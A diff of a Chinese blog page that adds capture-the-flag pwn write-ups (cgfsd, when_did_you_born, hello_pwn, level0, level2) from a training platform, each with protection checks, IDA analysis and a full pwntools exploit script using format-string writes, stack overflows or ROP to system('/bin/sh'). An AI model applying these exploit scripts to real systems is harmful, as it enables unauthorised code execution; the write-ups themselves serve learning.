@@ -83,22 +83,41 @@
 
 
 
-<meta name="description" content="cgpwn2 栈溢出ROP">
+<meta name="description" content="前言随缘更新，但是做了就更新（应该）">
 <meta name="keywords" content="ctf">
 <meta property="og:type" content="article">
 <meta property="og:title" content="攻防世界自闭之路">
 <meta property="og:url" content="http://yoursite.com/2019/08/19/攻防世界刷题笔记/index.html">
 <meta property="og:site_name" content="chessman">
-<meta property="og:description" content="cgpwn2 栈溢出ROP">
+<meta property="og:description" content="前言随缘更新，但是做了就更新（应该）">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://s2.ax1x.com/2019/08/21/mNUMX4.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/08/21/mNayqJ.jpg">
+<meta property="og:image" content="https://s2.ax1x.com/2019/08/21/mNsam8.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/08/21/mNs4k4.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/08/21/mU7zYn.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/08/21/mU2nAK.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/08/21/mUH8TH.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/08/21/mUIxF1.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/08/21/mUor79.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/08/21/mUHykj.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/08/21/mUb5xP.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/08/21/mUbL5j.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/08/21/mUbv2q.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/08/21/mUqfwF.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/08/21/mUOVu6.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/08/21/mUOLIe.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/08/21/mUOvRA.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/08/21/mUX9qf.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/08/21/mUOB2n.png">
 <meta property="og:image" content="https://s2.ax1x.com/2019/08/19/m3OUQe.png">
 <meta property="og:image" content="https://s2.ax1x.com/2019/08/19/m3XrnJ.png">
 <meta property="og:image" content="https://s2.ax1x.com/2019/08/19/m3XHAI.png">
 <meta property="og:updated_time" content="2019-08-20T16:00:00.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="攻防世界自闭之路">
-<meta name="twitter:description" content="cgpwn2 栈溢出ROP">
-<meta name="twitter:image" content="https://s2.ax1x.com/2019/08/19/m3OUQe.png">
+<meta name="twitter:description" content="前言随缘更新，但是做了就更新（应该）">
+<meta name="twitter:image" content="https://s2.ax1x.com/2019/08/21/mNUMX4.png">
 
 
 
@@ -339,7 +358,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  169 字
+                  1,035 字
                 </span>
               
 
@@ -355,7 +374,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  1 分钟
+                  4 分钟
                 </span>
               
             </div>
@@ -376,10 +395,71 @@
       
 
       
-        <h1 id="cgpwn2"><a href="#cgpwn2" class="headerlink" title="cgpwn2"></a>cgpwn2</h1><blockquote>
-<p>栈溢出ROP<br><a id="more"></a></p>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>随缘更新，但是做了就更新（应该）</p>
+<a id="more"></a>
+<h1 id="cgfsd"><a href="#cgfsd" class="headerlink" title="cgfsd"></a>cgfsd</h1><blockquote>
+<p>格式化字符串漏洞的简单利用 </p>
 </blockquote>
-<h2 id="查看溢出点和-bin-sh"><a href="#查看溢出点和-bin-sh" class="headerlink" title="查看溢出点和/bin/sh"></a>查看溢出点和/bin/sh</h2><p>程序没有/bin/sh,通过name写入/bin/sh的位置。<br>/bin/sh的地址就为name的地址<br><img src="https://s2.ax1x.com/2019/08/19/m3OUQe.png" alt></p>
+<p>做这道题的时候因为对格式化字符串漏洞不晓得所以放了几天去查了一些资料，但是还是不大晓得= =。所以这个wp就是个看完大佬们博客之后的一个搬运。等我哪天看懂这些个资料了，我再回来好好写写（希望能有这一天）</p>
+<h2 id="查看开启了什么保护"><a href="#查看开启了什么保护" class="headerlink" title="查看开启了什么保护"></a>查看开启了什么保护</h2><p><img src="https://s2.ax1x.com/2019/08/21/mNUMX4.png" alt></p>
+<p>开了canary和nx保护</p>
+<p><img src="https://s2.ax1x.com/2019/08/21/mNayqJ.jpg" alt></p>
+<h2 id="ida查看伪代码"><a href="#ida查看伪代码" class="headerlink" title="ida查看伪代码"></a>ida查看伪代码</h2><p>直接看题目就是能看到的意思就是控制<code>pwnme</code>的变量就行了，也就是<code>pwnne</code> = 8就行了。同时打开ida就知道pwnme为全局变量。所以直接拿到pwnme的地址，将pwnme覆盖成8就可以cat flag了。</p>
+<p><img src="https://s2.ax1x.com/2019/08/21/mNsam8.png" alt>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                同时pwnme的地址为</p>
+<p><img src="https://s2.ax1x.com/2019/08/21/mNs4k4.png" alt></p>
+<p>所以<code>payload = p32(pwnme的地址) + 偏移地址</code>偏移地址的计算能通过gdb打开esp直接数出来也能通过直接输入%x打印出来，方法很多。计算出来的偏移值为10</p>
+<h2 id="完整的exp"><a href="#完整的exp" class="headerlink" title="完整的exp"></a>完整的exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">p = remote(<span class="string">'111.198.29.45'</span>, <span class="number">31559</span>)</span><br><span class="line">pwnme = <span class="number">0x0804A068</span></span><br><span class="line"> </span><br><span class="line">payload1 = <span class="string">'aaaa'</span></span><br><span class="line">payload2 = p32(pwnme) + <span class="string">'aaaa%10$n'</span></span><br><span class="line"> </span><br><span class="line">p.sendlineafter(<span class="string">"\n"</span>,payload1)</span><br><span class="line">p.sendlineafter(<span class="string">"\n"</span>,payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="when-did-you-born"><a href="#when-did-you-born" class="headerlink" title="when_did_you_born"></a>when_did_you_born</h1><blockquote>
+<p>简单栈溢出</p>
+</blockquote>
+<p>覆盖地址</p>
+<h2 id="查看开启的保护"><a href="#查看开启的保护" class="headerlink" title="查看开启的保护"></a>查看开启的保护</h2><p><img src="https://s2.ax1x.com/2019/08/21/mU7zYn.png" alt></p>
+<h2 id="ida查看"><a href="#ida查看" class="headerlink" title="ida查看"></a>ida查看</h2><p>这个题目比较简单直接打开ida就能看出来题目意图，就是覆盖v5使其变成1926，就okkk了。而且点进v5就能直接查看地址偏移值<code>0x20-0x18</code></p>
+<p>就能直接得出<code>payload = 8*&#39;a&#39; + p64(0x0786)</code></p>
+<p><img src="https://s2.ax1x.com/2019/08/21/mU2nAK.png" alt></p>
+<h2 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(“”) <span class="comment">#当时没保存端口</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"What's Your Birth?\n"</span>,str(<span class="number">1998</span>))<span class="comment">#这里只要不等于1926就可以</span></span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">8</span> + p32(<span class="number">1926</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"What's Your Name?\n"</span>,payload)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br></pre></td></tr></table></figure>
+<h1 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello_pwn"></a>hello_pwn</h1><blockquote>
+<p>简单栈溢出</p>
+</blockquote>
+<h2 id="查看开启的保护-1"><a href="#查看开启的保护-1" class="headerlink" title="查看开启的保护"></a>查看开启的保护</h2><p><img src="https://s2.ax1x.com/2019/08/21/mUH8TH.png" alt></p>
+<h2 id="ida查看伪代码-1"><a href="#ida查看伪代码-1" class="headerlink" title="ida查看伪代码"></a>ida查看伪代码</h2><p>有点像上边这题，但是system函数不在main函数里面。所以直接shift+F12找到<code>cat flag</code>字符串并且定位到函数为<code>sub_400686()</code>。</p>
+<p><img src="https://s2.ax1x.com/2019/08/21/mUIxF1.png" alt></p>
+<p>然后直接查看main函数，找到read的输入与条件</p>
+<p><img src="https://s2.ax1x.com/2019/08/21/mUor79.png" alt></p>
+<p>则<code>payload = (0x601068-0x60106C)* &#39;a&#39; + p64(1853186401)</code></p>
+<h2 id="完整exp-1"><a href="#完整exp-1" class="headerlink" title="完整exp"></a>完整exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">"111.198.29.45"</span>,<span class="string">"31004"</span>)</span><br><span class="line">payload = <span class="number">4</span> * <span class="string">'a'</span> + p64(<span class="number">1853186401</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h1><blockquote>
+<p>简单栈溢出漏洞 构造ROP链</p>
+</blockquote>
+<h2 id="查看开启的保护-2"><a href="#查看开启的保护-2" class="headerlink" title="查看开启的保护"></a>查看开启的保护</h2><p><img src="https://s2.ax1x.com/2019/08/21/mUHykj.png" alt></p>
+<h2 id="ida查看伪代码-2"><a href="#ida查看伪代码-2" class="headerlink" title="ida查看伪代码"></a>ida查看伪代码</h2><p>main函数和中间的子函数，因为不是条件满足的，所以只能通过构造ROP链使其ret到callsysytem函数中</p>
+<p><img src="https://s2.ax1x.com/2019/08/21/mUb5xP.png" alt></p>
+<p><img src="https://s2.ax1x.com/2019/08/21/mUbL5j.png" alt></p>
+<p>可以看到buf段的栈顶位置为</p>
+<p><img src="https://s2.ax1x.com/2019/08/21/mUbv2q.png" alt></p>
+<p>则 <code>payload = 填充buf段的内存 + 0x8位覆盖EBP + callsystem的地址</code></p>
+<p>callsystem的地址为</p>
+<p><img src="https://s2.ax1x.com/2019/08/21/mUqfwF.png" alt></p>
+<h2 id="完整的exp-1"><a href="#完整的exp-1" class="headerlink" title="完整的exp"></a>完整的exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">a=remote()</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'A'</span>*<span class="number">0x80</span>+<span class="string">'A'</span>*<span class="number">8</span>+p64(<span class="number">0x0000000000400596</span>)</span><br><span class="line">a.recvuntil(<span class="string">"d"</span>)</span><br><span class="line"></span><br><span class="line">a.send(payload)</span><br><span class="line">a.interactive（）</span><br></pre></td></tr></table></figure>
+<h1 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h1><blockquote>
+<p>简单栈溢出漏洞 构造ROP链</p>
+</blockquote>
+<h2 id="查看开启的保护-3"><a href="#查看开启的保护-3" class="headerlink" title="查看开启的保护"></a>查看开启的保护</h2><p><img src="https://s2.ax1x.com/2019/08/21/mUOVu6.png" alt></p>
+<h2 id="ida查看伪代码-3"><a href="#ida查看伪代码-3" class="headerlink" title="ida查看伪代码"></a>ida查看伪代码</h2><p>查看main函数和vulner函数，意识到需要构造ROP链</p>
+<p><img src="https://s2.ax1x.com/2019/08/21/mUOLIe.png" alt></p>
+<p><img src="https://s2.ax1x.com/2019/08/21/mUOvRA.png" alt></p>
+<p>那么就查看buf段内存</p>
+<p><img src="https://s2.ax1x.com/2019/08/21/mUX9qf.png" alt></p>
+<p>则payload</p>
+<p>查看字符串代码，发现有/bin/sh函数。</p>
+<p><img src="https://s2.ax1x.com/2019/08/21/mUOB2n.png" alt></p>
+<p>但是/bin/sh和system不是一起的。所以需要构造system(“/bin/sh”)的值。所以得到payload</p>
+<p><code>payload = 0x88填充buf + 0x4填充EBP + system()函数地址覆盖EIP + 0x0任意返回地址 + ‘/bin/sh’字符串地址</code></p>
+<h2 id="完整exp-2"><a href="#完整exp-2" class="headerlink" title="完整exp"></a>完整exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span>  pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">tp = remote(<span class="string">'111.198.29.45'</span>,<span class="number">47512</span>)</span><br><span class="line"></span><br><span class="line">shell_addr = <span class="number">0x0804A024</span></span><br><span class="line">buf = <span class="number">0x88</span> + <span class="number">0x04</span></span><br><span class="line">sys_addr = <span class="number">0x08048320</span></span><br><span class="line"></span><br><span class="line">payload =  buf *<span class="string">'A'</span> + p32(sys_addr) + p32(<span class="number">0</span>) + p32(shell_addr)</span><br><span class="line"></span><br><span class="line">tp.recvuntil(<span class="string">"Input:"</span>)</span><br><span class="line">tp.send(payload)</span><br><span class="line">tp.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="cgpwn2"><a href="#cgpwn2" class="headerlink" title="cgpwn2"></a>cgpwn2</h1><blockquote>
+<p>ROP绕过nx</p>
+</blockquote>
+<h2 id="查看开启的保护-4"><a href="#查看开启的保护-4" class="headerlink" title="查看开启的保护"></a>查看开启的保护</h2><p>程序没有/bin/sh,通过name写入/bin/sh的位置。<br>/bin/sh的地址就为name的地址<br><img src="https://s2.ax1x.com/2019/08/19/m3OUQe.png" alt></p>
 <p>NX是打开的，所以不能利用栈，</p>
 <h2 id="查看程序伪代码"><a href="#查看程序伪代码" class="headerlink" title="查看程序伪代码"></a>查看程序伪代码</h2><p><img src="https://s2.ax1x.com/2019/08/19/m3XrnJ.png" alt></p>
 <p>能够利用的gets为name和s两个值。通过<br><img src="https://s2.ax1x.com/2019/08/19/m3XHAI.png" alt></p>
@@ -569,7 +649,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#cgpwn2"><span class="nav-number">1.</span> <span class="nav-text">cgpwn2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#查看溢出点和-bin-sh"><span class="nav-number">1.1.</span> <span class="nav-text">查看溢出点和/bin/sh</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#查看程序伪代码"><span class="nav-number">1.2.</span> <span class="nav-text">查看程序伪代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#完整的exp脚本为"><span class="nav-number">1.3.</span> <span class="nav-text">完整的exp脚本为</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#cgfsd"><span class="nav-number">2.</span> <span class="nav-text">cgfsd</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#查看开启了什么保护"><span class="nav-number">2.1.</span> <span class="nav-text">查看开启了什么保护</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ida查看伪代码"><span class="nav-number">2.2.</span> <span class="nav-text">ida查看伪代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#完整的exp"><span class="nav-number">2.3.</span> <span class="nav-text">完整的exp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#when-did-you-born"><span class="nav-number">3.</span> <span class="nav-text">when_did_you_born</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#查看开启的保护"><span class="nav-number">3.1.</span> <span class="nav-text">查看开启的保护</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ida查看"><span class="nav-number">3.2.</span> <span class="nav-text">ida查看</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#完整exp"><span class="nav-number">3.3.</span> <span class="nav-text">完整exp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#hello-pwn"><span class="nav-number">4.</span> <span class="nav-text">hello_pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#查看开启的保护-1"><span class="nav-number">4.1.</span> <span class="nav-text">查看开启的保护</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ida查看伪代码-1"><span class="nav-number">4.2.</span> <span class="nav-text">ida查看伪代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#完整exp-1"><span class="nav-number">4.3.</span> <span class="nav-text">完整exp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#level0"><span class="nav-number">5.</span> <span class="nav-text">level0</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#查看开启的保护-2"><span class="nav-number">5.1.</span> <span class="nav-text">查看开启的保护</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ida查看伪代码-2"><span class="nav-number">5.2.</span> <span class="nav-text">ida查看伪代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#完整的exp-1"><span class="nav-number">5.3.</span> <span class="nav-text">完整的exp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#level2"><span class="nav-number">6.</span> <span class="nav-text">level2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#查看开启的保护-3"><span class="nav-number">6.1.</span> <span class="nav-text">查看开启的保护</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ida查看伪代码-3"><span class="nav-number">6.2.</span> <span class="nav-text">ida查看伪代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#完整exp-2"><span class="nav-number">6.3.</span> <span class="nav-text">完整exp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#cgpwn2"><span class="nav-number">7.</span> <span class="nav-text">cgpwn2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#查看开启的保护-4"><span class="nav-number">7.1.</span> <span class="nav-text">查看开启的保护</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#查看程序伪代码"><span class="nav-number">7.2.</span> <span class="nav-text">查看程序伪代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#完整的exp脚本为"><span class="nav-number">7.3.</span> <span class="nav-text">完整的exp脚本为</span></a></li></ol></li></ol></div>
             
 
           </div>
@@ -603,7 +683,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">917</span>
+    <span title="Site words total count">1.8k</span>
   
 </div>
 
